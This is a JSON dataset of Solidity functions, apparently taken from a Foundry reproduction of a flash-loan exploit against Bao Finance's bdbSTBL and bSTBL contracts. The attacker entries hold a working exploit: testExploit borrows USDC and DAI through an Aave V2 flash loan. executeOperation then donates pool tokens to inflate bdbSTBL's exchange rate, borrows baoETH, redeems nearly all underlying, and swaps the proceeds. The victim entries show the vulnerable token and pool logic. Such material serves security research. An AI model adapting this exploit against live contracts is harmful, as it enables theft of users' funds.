[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        AaveV2.deposit(address(USDC), amounts[0], address(this), 0);\n        AaveV2.deposit(address(DAI), amounts[1], address(this), 0);\n        bSTBL.joinPool(34_819_000 * 1e18 + 1); // mint bdbSTBL underlyingtoken with USDC and DAI\n\n        bdbSTBL.mint(1, true); // mint 5 bdbSTBL\n        bdbSTBL.redeem(3); // redeem 3 bdbSTBL, remain 2 bdbSTBL\n\n        bSTBL.transfer(address(bdbSTBL), 34_819_000 * 1e18); // donate underlyingtoken to inflate bdbSTBL exchangeRate\n        bdbaoETH.borrow(41.3 ether);\n        bdbSTBL.redeemUnderlying(34_819_000 * 1e18); //redeem almost all underlyingtoken\n\n        bSTBL.exitPool(34_819_000 * 1e18); // burn underlyingtoken to get USDC and DAI\n\n        AaveV2.withdraw(address(USDC), amounts[0] - 1, address(this));\n        AaveV2.withdraw(address(DAI), amounts[1] - 1, address(this));\n\n        swapbaoETHToUSDCAndDAI();\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_620_870);\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(aDAI), \"aDAI\");\n        vm.label(address(aUSDC), \"aUSDC\");\n        vm.label(address(AToken1), \"AToken1\");\n        vm.label(address(AToken2), \"AToken2\");\n        vm.label(address(bSTBL), \"bSTBL\");\n        vm.label(address(baoETH), \"baoETH\");\n        vm.label(address(bdbSTBL), \"bdbSTBL\");\n        vm.label(address(bdbaoETH), \"bdbaoETH\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(AaveV2), \"AaveV2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        // FiatToken.approve(address(USDC), type(uint256).max);\n        // AToken1.approve(address(aUSDC), type(uint256).max);\n        // AToken2.approve(address(aDAI), type(uint256).max);\n        // Facet.approve(address(bSTBL), type(uint256).max);\n        USDC.approve(address(AaveV2), type(uint256).max);\n        DAI.approve(address(AaveV2), type(uint256).max);\n        aUSDC.approve(address(bSTBL), type(uint256).max);\n        aDAI.approve(address(bSTBL), type(uint256).max);\n        bSTBL.approve(address(bdbSTBL), type(uint256).max);\n        baoETH.approve(address(Balancer), type(uint256).max);\n        WETH.approve(address(Router), type(uint256).max);\n\n        address[] memory assets = new address[](2);\n        assets[0] = address(USDC);\n        assets[1] = address(DAI);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 17_550_000 * 1e6;\n        amounts[1] = 17_510_000 * 1e18;\n        uint256[] memory modes = new uint256[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address _owner, address _spender)\n    external\n    view\n    override\n    returns (uint256)\n  {\n    return LibERC20Storage.erc20Storage().allowances[_owner][_spender];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address _spender, uint256 _amount)\n    external\n    override\n    returns (bool)\n  {\n    require(_spender != address(0), \"SPENDER_INVALID\");\n    LibERC20Storage.erc20Storage().allowances[msg.sender][_spender] = _amount;\n    emit Approval(msg.sender, _spender, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address _of) external view override returns (uint256) {\n    return LibERC20Storage.erc20Storage().balances[_of];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "  function decimals() external pure override returns (uint8) {\n    return 18;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(address _reserve, uint256 _amount, uint16 _refferalCode) external override {\n        require(!revertDeposit, \"Deposited revert\");\n        require(token.transferFrom(msg.sender, address(aToken), _amount), \"Transfer failed\");\n        aToken.mint(_amount, msg.sender);\n    } \n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(address _receiver, uint256 _amount) external override protectedCall {\n    LibERC20.mint(_receiver, _amount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "  function name() external view override returns (string memory) {\n    return LibERC20Storage.erc20Storage().name;\n  }\n\n  function setName(string calldata _name) external override protectedCall {\n    LibERC20Storage.erc20Storage().name = _name;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint256 _amount) external {\n        require(!revertRedeem, \"Reverted\");\n\n        if(_amount == uint256(-1)) {\n            _amount = balanceOf(msg.sender);\n        }\n\n        _burn(msg.sender, _amount);\n        require(token.transfer(msg.sender, _amount), \"Transfer failed\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "    function redeemUnderlying(uint256 _amount) external returns(uint256) {\n        uint256 internalAmount = _amount.mul(10**18).div(exchangeRate);\n        _burn(msg.sender, internalAmount);\n\n        underlying.mint(_amount, msg.sender);\n\n        return errorCode;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "  function symbol() external view override returns (string memory) {\n    return LibERC20Storage.erc20Storage().symbol;\n  }\n\n  function setSymbol(string calldata _symbol) external override protectedCall {\n    LibERC20Storage.erc20Storage().symbol = _symbol;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "  function totalSupply() external view override returns (uint256) {\n    return LibERC20Storage.erc20Storage().totalSupply;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "  function transfer(address _to, uint256 _amount)\n    external\n    override\n    returns (bool)\n  {\n    _transfer(msg.sender, _to, _amount);\n    return true;\n  }\n\n  function transferFrom(\n    address _from,\n    address _to,\n    uint256 _amount\n  ) external override returns (bool) {\n    LibERC20Storage.ERC20Storage storage es = LibERC20Storage.erc20Storage();\n    require(_from != address(0), \"FROM_INVALID\");\n\n    // Update approval if not set to max uint256\n    if (es.allowances[_from][msg.sender] != uint256(-1)) {\n      uint256 newApproval = es.allowances[_from][msg.sender].sub(_amount);\n      es.allowances[_from][msg.sender] = newApproval;\n      emit Approval(_from, msg.sender, newApproval);\n    }\n\n    _transfer(_from, _to, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "  function transferFrom(\n    address _from,\n    address _to,\n    uint256 _amount\n  ) external override returns (bool) {\n    LibERC20Storage.ERC20Storage storage es = LibERC20Storage.erc20Storage();\n    require(_from != address(0), \"FROM_INVALID\");\n\n    // Update approval if not set to max uint256\n    if (es.allowances[_from][msg.sender] != uint256(-1)) {\n      uint256 newApproval = es.allowances[_from][msg.sender].sub(_amount);\n      es.allowances[_from][msg.sender] = newApproval;\n      emit Approval(_from, msg.sender, newApproval);\n    }\n\n    _transfer(_from, _to, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbdbSTBL",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "  function withdraw(\n    address asset,\n    uint256 amount,\n    address to\n  ) external returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbSTBL",
    "source_type": "victim_contract",
    "function_name": "exitPool",
    "original_code": "    function exitPool(uint256 _amount) external override virtual noReentry {\n        require(!this.getLock(), \"POOL_LOCKED\");\n        chargeOutstandingAnnualizedFee();\n        LibBasketStorage.BasketStorage storage bs = LibBasketStorage.basketStorage();\n        uint256 totalSupply = LibERC20Storage.erc20Storage().totalSupply;\n\n        uint256 feeAmount = _amount.mul(bs.exitFee).div(10**18);\n\n        for(uint256 i; i < bs.tokens.length; i ++) {\n            IERC20 token = bs.tokens[i];\n            uint256 tokenBalance = balance(address(token));\n            // redeem less tokens if there is an exit fee\n            uint256 tokenAmount = tokenBalance.mul(_amount.sub(feeAmount)).div(totalSupply);\n            require(tokenBalance.sub(tokenAmount) >= MIN_AMOUNT, \"TOKEN_BALANCE_TOO_LOW\");\n            token.safeTransfer(msg.sender, tokenAmount);\n        }\n\n         // If there is any fee that should go to the beneficiary mint it\n        if(\n            feeAmount != 0 &&\n            bs.exitFeeBeneficiaryShare != 0 &&\n            bs.feeBeneficiary != address(0)\n        ) {\n            uint256 feeBeneficiaryShare = feeAmount.mul(bs.exitFeeBeneficiaryShare).div(10**18);\n            if(feeBeneficiaryShare != 0) {\n                LibERC20.mint(bs.feeBeneficiary, feeBeneficiaryShare);\n            }\n        }\n\n        require(totalSupply.sub(_amount) >= MIN_AMOUNT, \"POOL_TOKEN_BALANCE_TOO_LOW\");\n        LibERC20.burn(msg.sender, _amount);\n        emit PoolExited(msg.sender, _amount);\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IbSTBL",
    "source_type": "victim_contract",
    "function_name": "joinPool",
    "original_code": "    function joinPool(uint256 _amount) external override noReentry {\n        require(!this.getLock(), \"POOL_LOCKED\");\n        chargeOutstandingAnnualizedFee();\n        LibBasketStorage.BasketStorage storage bs = LibBasketStorage.basketStorage();\n        uint256 totalSupply = LibERC20Storage.erc20Storage().totalSupply;\n        require(totalSupply.add(_amount) <= this.getCap(), \"MAX_POOL_CAP_REACHED\");\n\n        uint256 feeAmount = _amount.mul(bs.entryFee).div(10**18);\n\n        for(uint256 i; i < bs.tokens.length; i ++) {\n            IERC20 token = bs.tokens[i];\n            uint256 tokenAmount = balance(address(token)).mul(_amount.add(feeAmount)).div(totalSupply);\n            require(tokenAmount != 0, \"AMOUNT_TOO_SMALL\");\n            token.safeTransferFrom(msg.sender, address(this), tokenAmount);\n        }\n\n        // If there is any fee that should go to the beneficiary mint it\n        if(\n            feeAmount != 0 &&\n            bs.entryFeeBeneficiaryShare != 0 &&\n            bs.feeBeneficiary != address(0)\n        ) {\n            uint256 feeBeneficiaryShare = feeAmount.mul(bs.entryFeeBeneficiaryShare).div(10**18);\n            if(feeBeneficiaryShare != 0) {\n                LibERC20.mint(bs.feeBeneficiary, feeBeneficiaryShare);\n            }\n        }\n\n        LibERC20.mint(msg.sender, _amount);\n        emit PoolJoined(msg.sender, _amount);\n    }\n\n    // Must be overwritten to withdraw from strategies\n",
    "description": ""
  }
]